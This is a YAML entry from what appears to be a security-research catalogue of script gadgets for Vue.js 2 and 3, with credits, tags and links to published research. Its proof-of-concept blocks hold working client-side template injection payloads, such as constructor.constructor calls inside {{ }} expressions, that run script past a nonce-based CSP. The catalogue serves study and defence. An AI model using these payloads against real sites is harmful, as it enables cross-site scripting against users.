---
description: Vue.js is an MIT-licensed open source project with its ongoing development made possible entirely by the support of these awesome [backers](https://github.com/vuejs/core/blob/main/BACKERS.md). If you'd like to join them, please consider [sponsoring Vue's development](https://vuejs.org/sponsor/).
github: vuejs/core
gadgets:
  Vue 3:
    authors:
      - twitter:garethheyes
      - twitter:LewisArdern
      - twitter:PwnFunction
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: This is not the full list of different CSTI payloads. The full list can be found [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected).
        code: |
          <!-- user input -->
          <div id="app">
            <p>{{_openBlock.constructor("alert(1)")()}}</p>
            <p>{{_createBlock.constructor("alert(2)")()}}</p>
            <p>{{_toDisplayString.constructor("alert(3)")()}}</p>
            <p>{{_createVNode.constructor("alert(4)")()}}</p>
            <p v-show=_createBlock.constructor`alert(5)`()></p>

            <x></x>
            <teleport></teleport>
          </div>

          <script nonce="secret" src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
          <script nonce="secret">
            const app = Vue.createApp({
              data() { return { input: "# hello" }}
            })
            app.mount("#app");
          </script>
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected
      - https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets
  Vue 2:
    authors:
      - twitter:cure53berlin
      - twitter:garethheyes
      - twitter:slekies
      - twitter:LewisArdern
      - twitter:PwnFunction
      - twitter:sirdarckcat
      - twitter:kkotowicz
      - twitter:davwwwx
      - twitter:p4fg
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          This is not the full list of different CSTI payloads. The full list can be found [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected).

          *The author of this gadget is [cure53berlin](https://x.com/cure53berlin), but since many other gadgets were found by other hackers, I've listed all of them as authors for this gadget.*
        code: |
          <!-- user input -->
          <div id="app">
            <p>{{constructor.constructor("alert(document.domain)")()}}</p>
          </div>

          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
          <script nonce="secret">
            new Vue({
              el: "#app",
              data: {}
            });
          </script>
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected
      - https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets
---
